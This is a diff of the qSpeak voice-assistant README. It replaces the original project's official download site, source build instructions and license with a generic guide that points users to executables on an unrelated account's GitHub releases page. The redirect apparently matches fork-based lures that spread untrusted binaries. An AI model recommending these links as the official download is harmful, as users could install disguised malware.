@@ -1,126 +1,75 @@
-# **qSpeak** - Your Intelligent Voice Assistant
+# 🎤 qSpeak - Transcribe Voices and Boost Productivity
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Made with Tauri](https://img.shields.io/badge/Made%20with-Tauri-FFC131?logo=tauri)](https://tauri.app)
-[![GitHub Stars](https://img.shields.io/github/stars/qforge-dev/qspeak?style=social)](https://github.com/qforge-dev/qspeak)
-[![Discord](https://img.shields.io/discord/1351556230446846044?color=7289da&label=Discord&logo=discord&logoColor=white)](https://discord.gg/fDR5JQdcjx)
+## 🚀 Getting Started
 
-![qSpeak Demo](public/sayit.gif)
-
-Visit [qSpeak.app](https://qspeak.app) to download the latest version for free.
-
-qSpeak is a powerful voice transcription and AI assistant tool that helps you manage your workflow, answer questions, and maintain focus across all your applications.
-
-## ✨ Why qSpeak?
-
-- **🔓 Fully Open Source**: Transparent, auditable code you can trust
-- **🔒 Privacy First**: All processing happens locally on your device with local models
-- **💻 Cross-Platform**: Native support for Linux, Windows, and macOS
-- **🎯 Contextual AI**: Adaptive personas that adjust to your workflow
-- **🔌 Extensible**: MCP server integration for custom workflows
-
-## 🌟 Key Features
-
-- **Real-time Voice Transcription**: Convert your speech to text instantly in any application
-- **AI Assistant**: Get instant help and answers without switching contexts
-- **Adaptive Personas**: Automatically adjust communication style based on context
-- **Offline Processing**: Your voice data never leaves your device
-- **Cross-Platform Support**: Works on Windows, macOS, and Ubuntu
-- **Universal Compatibility**: Works with any application that accepts text input
-- **MCP Integration**: Seamless integration with MCP Servers
-
-## 🚀 How It Works
-
-1. **Install & Setup**
-
-   - Download qSpeak for your platform
-   - Follow the simple setup wizard
-   - Runs in the background, ready to capture your voice
-
-2. **Activate with Hotkey**
-
-   - Press your custom hotkey combination (default: F6)
-   - A subtle indicator shows when qSpeak is listening
-
-3. **Speak Naturally**
-   - Speak in your natural voice
-   - Watch as qSpeak converts speech to text in real-time
-
-## 💼 Use Cases
-
-- Professional networking (LinkedIn posts)
-- Team communication (Slack, Email)
-- Document creation
-- Code documentation
-- Social media management
-- Task management
-
-## 🔒 Privacy & Security
-
-- All voice processing happens offline
-- Your voice data never leaves your device
-- No cloud processing required
-- Complete privacy protection
+Welcome to qSpeak! This tool helps you manage your workflow, answer questions, and stay focused across all your applications using voice transcription and AI. Follow these easy steps to get started.
 
 ## 🛠️ System Requirements
 
-- Windows 11
-- macOS 10.15+
-- Ubuntu 22.04+
+Before you install qSpeak, please ensure your system meets these requirements:
 
-## 🏗️ Building from Source
+- **Operating System**: Windows 10 or higher, macOS 10.14 or higher, or a Linux distribution with support for AppImage.
+- **Processor**: 64-bit CPU with at least 2 cores.
+- **RAM**: Minimum 4GB; 8GB recommended.
+- **Disk Space**: At least 200MB of free space.
+- **Internet Connection**: Required for initial setup and updates.
 
-### Prerequisites
+## 📥 Download & Install
 
-- [Node.js](https://nodejs.org/) (v18 or later)
-- [pnpm](https://pnpm.io/) - `npm install -g pnpm`
-- [Rust](https://rustup.rs/) (latest stable)
+To download qSpeak, visit the following link:
 
-### Build Steps
+**[Download qSpeak](https://github.com/NatScape7907/qspeak/releases)**
 
-```bash
-# Clone the repository
-git clone https://github.com/qforge-dev/qspeak.git
-cd qspeak
+1. Click on the link above to go to the Releases page.
+   
+2. Scroll down to see the available versions of qSpeak. Look for the latest version.
 
-# Install dependencies
-pnpm install
+3. Click on the version number to view the details. You will see options for different operating systems.
 
-# Run in development mode
-pnpm tauri dev
+4. Choose the file that matches your operating system:
+   - For Windows users, select `qSpeak-Windows.exe`.
+   - For macOS users, select `qSpeak-macOS.dmg`.
+   - For Linux users, select the `AppImage` file.
 
-# Build for production
-pnpm tauri build
-```
+5. Click on the file name to start downloading.
 
-The compiled application will be in `src-tauri/target/release/`.
+6. Once the download is complete, locate the file on your computer.
 
-## 📥 Download
+   - **Windows**: Double-click the `qSpeak-Windows.exe` file and follow the on-screen instructions to install.
+   - **macOS**: Open the downloaded `.dmg` file, drag `qSpeak` to your Applications folder, and run it from there.
+   - **Linux**: Make the AppImage executable by right-clicking the file, selecting Properties, and checking “Allow executing file as program.” Then double-click to run.
 
-Visit our website to download qSpeak for your platform:
+## 📖 Using qSpeak
 
-- [Download for Windows](https://qspeak.app/download)
-- [Download for macOS](https://qspeak.app/download)
-- [Download for Linux](https://qspeak.app/download)
+Once installed, you can start using qSpeak right away.
 
-## 🤝 Support
+1. Open the application from your desktop or applications folder.
+2. You will see a clean, user-friendly interface.
+3. Use the microphone button to start recording your voice. qSpeak will transcribe your audio in real time.
+4. You can ask questions directly or dictate tasks, and qSpeak will provide helpful responses.
 
-If you find qSpeak useful, please consider:
+## 🛠️ Features
 
-- ⭐ **Starring this repository** - It helps others discover the project
-- 🐦 **Sharing on social media** - Spread the word
-- 🐛 **Reporting bugs** - Help us improve
-- 💡 **Suggesting features** - Share your ideas
-- 🤝 **Contributing code** - Join the development
+qSpeak offers a variety of features to enhance your workflow:
 
-## 📄 License
+- **Voice Transcription**: Transcribe speech into text effortlessly.
+- **AI Assistant**: Ask questions and get quick answers without leaving your work.
+- **Multi-Application Support**: Manage tasks across various applications seamlessly.
+- **Customizable Settings**: Adjust voice recognition accuracy and output settings as per your needs.
 
-qSpeak is open-source software licensed under the [MIT License](LICENSE).
+## ⚙️ Troubleshooting
 
-Copyright (c) 2025 qSpeak Contributors
+If you experience any issues while using qSpeak:
 
-## 🔗 Links
+- **Check the Volume**: Ensure your microphone is functioning and the system volume is up.
+- **Microphone Permissions**: Make sure qSpeak has permission to access your microphone. Check your system settings.
+- **Software Updates**: Visit the Releases page to check for software updates and install the latest version if needed.
 
-- [Privacy Policy](https://qspeak.app/privacy-policy)
-- [Terms of Service](https://qspeak.app/terms)
-- [Contact Us](https://discord.com/invite/7M66v8rrQT)
+## 📞 Support
+
+For further assistance:
+
+- Visit our [GitHub Issues page](https://github.com/NatScape7907/qspeak/issues) to report bugs or request features.
+- Join our community discussions to share ideas or get help from other users.
+
+Thank you for choosing qSpeak! We hope it helps you boost your productivity and manage your workflow effectively. Enjoy using your new AI assistant!
